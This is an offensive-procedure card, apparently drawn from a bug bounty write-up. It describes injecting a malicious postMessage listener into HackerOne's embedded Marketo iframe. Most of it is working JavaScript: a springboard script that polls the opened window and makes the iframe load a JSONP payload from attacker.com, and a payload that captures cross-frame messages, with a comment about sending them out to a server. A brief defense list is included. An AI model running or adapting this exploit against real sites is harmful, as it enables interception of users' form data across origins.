---
id: proc-inject-listener-hackerone-iframe
tags:
  - xss
  - postmessage
  - listener-injection
type: procedure
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:56:03.958Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Message-Listener-in-HackerOne-Iframe

## Summary

This procedure polls the opened HackerOne window to target its Marketo iframe and injects a second JSONP payload that registers a malicious postMessage listener for data interception.

## Description

Using setInterval from the springboard page, access the iframe in the new window (b.frames[0]) and repeat the postMessage exploit to load another JSONP script. This script adds a listener that captures non-Marketo origin messages. Prerequisites: Frame-jump success. Outcome: Listener active in target iframe.

## Requirements

1. Reference to opened window (var b)
2. Second JSONP endpoint (jsonp2.php)
3. Timing to wait for iframe load

## Defense

Defensive measures and detection strategies:

- Restrict cross-frame postMessage to same-origin
- Audit third-party iframes for injected listeners
- Log and alert on anomalous message events

## Objectives

1. Poll and target the remote iframe
2. Inject listener via JSONP
3. Prepare for form data capture

## Instructions

### Step 1: Set Up Polling Interval

**Context**: From springboard, interval-send messages to the target iframe.

Add to springboard script:

```javascript
var b = window.open('https://www.hackerone.com/product/overview#contact', 'b');
setInterval(function() {
  try {
    if (b && b.frames && b.frames[0]) {
      b.frames[0].postMessage({
        ajaxParams: {
          url: 'https://attacker.com/jsonp2.php?callback=inject2',
          dataType: 'jsonp',
          method: 'get'
        }
      }, '*');
      clearInterval(this); // Stop after success
    }
  } catch(e) { console.log('Polling...'); }
}, 1000);
```

> Polls every second; adjust timeout as needed.

### Step 2: Define Listener Payload

**Context**: JSONP2 loads the capturing listener.

jsonp2.php content:

```javascript
inject2({
  // Empty response
}); 
window.addEventListener('message', function(e) {
  if (e.origin !== 'marketo') {
    alert('I HAVE YOUR DATA NOW\n' + JSON.stringify(e.data));
    // Or exfil to server
  }
});
```

> Expected: Listener added; test by sending a dummy message.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[postmessage]]
- [[listener-injection]]
